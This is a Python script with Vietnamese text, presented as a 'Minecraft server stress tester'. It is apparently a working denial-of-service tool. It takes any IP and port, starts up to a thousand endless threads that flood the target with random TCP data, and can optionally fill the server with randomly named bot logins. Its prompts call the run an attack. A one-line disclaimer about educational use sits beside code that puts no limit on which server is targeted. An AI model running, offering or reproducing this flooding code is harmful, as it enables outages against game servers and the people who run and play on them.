# -*- coding: utf-8 -*-
import socket
import threading
import time
import os
import sys
import random
import string

# Cố gắng import thư viện mcproto và hướng dẫn cài đặt nếu thiếu
try:
    from mcproto.connection import Connection
except ImportError:
    print("[!] Lỗi: Thư viện 'mcproto' chưa được cài đặt.")
    print("[!] Vui lòng chạy lệnh: pip install mcproto")
    sys.exit()

# === CÁC HÀM TIỆN ÍCH ===
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def progress_bar():
    print("==================================================================")
    for i in range(101):
        sys.stdout.write(f"\r[*] Đang khởi động và chuẩn bị tài nguyên... [{i}%]")
        sys.stdout.flush()
        time.sleep(0.02)
    print("\n==================================================================")

def generate_random_name(length=10):
    # Tạo tên ngẫu nhiên cho bot, ví dụ: Beenz_aJ8sD9kLp2
    letters_and_digits = string.ascii_letters + string.digits
    return 'Beenz_' + ''.join(random.choice(letters_and_digits) for i in range(length))

# === CÁC HÀM TẤN CÔNG (CHẠY TRONG LUỒNG RIÊNG) ===

# 1. Hàm spam packet (như cũ)
def attack_thread_packet(ip, port, packets_per_thread):
    random_data = os.urandom(1024)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            for _ in range(packets_per_thread):
                s.sendall(random_data)
            s.close()
        except Exception:
            pass

# 2. Hàm cho một bot duy nhất join server
def attack_thread_bot(ip, port, bot_name):
    try:
        conn = Connection(
            host=ip,
            port=port,
            username=bot_name
        )
        conn.connect()
        conn.login()
        print(f"[+] Bot '{bot_name}' đã tham gia thành công!")
        # Bot sẽ giữ kết nối cho đến khi bị kick hoặc server sập
        # Thêm một vòng lặp để giữ kết nối và xử lý keep-alive (nếu cần)
        while True:
            time.sleep(1) 
    except Exception as e:
        print(f"[-] Bot '{bot_name}' không thể tham gia. Lý do: {str(e)}")

# 3. Hàm quản lý việc tạo và thả bot theo thời gian
def bot_spawner(ip, port, num_bots, delay):
    print(f"\n[*] Bắt đầu thả {num_bots} bot vào server, mỗi bot cách nhau {delay} giây.")
    for i in range(num_bots):
        bot_name = generate_random_name()
        # Mỗi bot sẽ chạy trên một luồng riêng để không làm nghẽn quá trình
        bot_thread = threading.Thread(target=attack_thread_bot, args=(ip, port, bot_name))
        bot_thread.daemon = True
        bot_thread.start()
        print(f"[*] Đang thả bot {i + 1}/{num_bots}: {bot_name}")
        time.sleep(delay)
    
    print("\n[+] Đã thả hết số lượng bot theo yêu cầu.")
    print("[-] Trùm ném Cứt Phi vụ thất bại (nếu server vẫn còn sống).")
    print("[-] Gói tin (packet) vẫn tiếp tục được gửi đi...")


# === HÀM CHÍNH ===
def main():
    clear_screen()
    print("""
    ******************************************************************
    *                                                                *
    *      BEENZ - MINECRAFT SERVER STRESS TESTER v2.0               *
    *      (Packet Spam + Bot Join)                                  *
    *                                                                *
    ******************************************************************
    """)
    print("CHÚ Ý: SCRIPT CHỈ DÀNH CHO MỤC ĐÍCH GIÁO DỤC VÀ THỬ NGHIỆM")
    print("HIỆU NĂNG SERVER CỦA BẠN. KHÔNG SỬ DỤNG VỚI MỤC ĐÍCH PHÁ HOẠI.\n")

    progress_bar()
    
    print("[+] Đã Khởi Động Vip1")
    print("[+] Vui lòng nhập IP và Port của server.")
    print("------------------------------------------------------------------\n")

    try:
        # === Nhập thông tin cơ bản ===
        target_ip = input("[>] Nhập IP/Tên miền của server: ").strip()
        target_port = int(input("[>] Nhập Port của server (mặc định là 25565): "))

        # === Cấu hình Spam Packet ===
        print("\n--- Cấu hình Spam Packet ---")
        max_total_packets = 100000000000000000
        max_packets_per_thread = 9999999
        
        total_packets = int(input(f"[>] Số lượng cứt (tổng packet, max: {max_total_packets}): "))
        if total_packets > max_total_packets:
            total_packets = max_total_packets
            print(f"[!] Vượt giới hạn, đã đặt về max: {total_packets}")

        packets_per_thread = int(input(f"[>] Số lượng cứt mỗi luồng (packet/thread, max: {max_packets_per_thread}): "))
        if packets_per_thread > max_packets_per_thread:
            packets_per_thread = max_packets_per_thread
            print(f"[!] Vượt giới hạn, đã đặt về max: {packets_per_thread}")

        # === Cấu hình Spam Bot ===
        print("\n--- Cấu hình Spam Bot ---")
        spam_bots_enabled = False
        num_bots = 0
        join_delay = 1

        choice = input("[>] Spam bot không? (nhập 'on' để bật / 'off' để tắt): ").lower().strip()
        if choice == 'on':
            spam_bots_enabled = True
            num_bots = int(input("[>] Số lượng bot join server: "))
            join_delay = float(input("[>] Số giây mỗi bot join (VD: 0.5, 1, 2): "))
            if join_delay < 0: join_delay = 0.1 # Tránh số âm
        else:
            print("[-] Bỏ qua tính năng spam bot.")

        # === Bắt đầu tấn công ===
        print("\n==================================================================")
        print(f"[*] Chuẩn bị tấn công server: {target_ip}:{target_port}")
        
        num_packet_threads = min(1000, total_packets // (packets_per_thread or 1))
        if num_packet_threads == 0: num_packet_threads = 1
        
        print(f"[*] Chế độ spam packet: BẬT ({num_packet_threads} luồng)")
        if spam_bots_enabled:
            print(f"[*] Chế độ spam bot: BẬT ({num_bots} bot, delay {join_delay}s)")
        else:
            print("[*] Chế độ spam bot: TẮT")
            
        print("\n[!!!] ĐANG TẤN CÔNG... (Nhấn CTRL + C để dừng lại)")
        print("==================================================================")
        time.sleep(3)

        # 1. Bắt đầu các luồng spam packet
        for _ in range(num_packet_threads):
            t_packet = threading.Thread(target=attack_thread_packet, args=(target_ip, target_port, packets_per_thread))
            t_packet.daemon = True
            t_packet.start()

        # 2. Nếu bật spam bot, bắt đầu luồng quản lý bot
        if spam_bots_enabled:
            t_bot_spawner = threading.Thread(target=bot_spawner, args=(target_ip, target_port, num_bots, join_delay))
            t_bot_spawner.daemon = True
            t_bot_spawner.start()

        # Giữ chương trình chính chạy để các luồng con hoạt động
        while True:
            time.sleep(1)

    except ValueError:
        print("\n[!] Lỗi: Port và các số lượng phải là SỐ. Vui lòng chạy lại script.")
    except KeyboardInterrupt:
        print("\n\n[*] Đã dừng script theo yêu cầu của bạn. Tạm biệt!")
    except Exception as e:
        print(f"\n[!] Một lỗi không xác định đã xảy ra: {e}")

if __name__ == "__main__":
    main()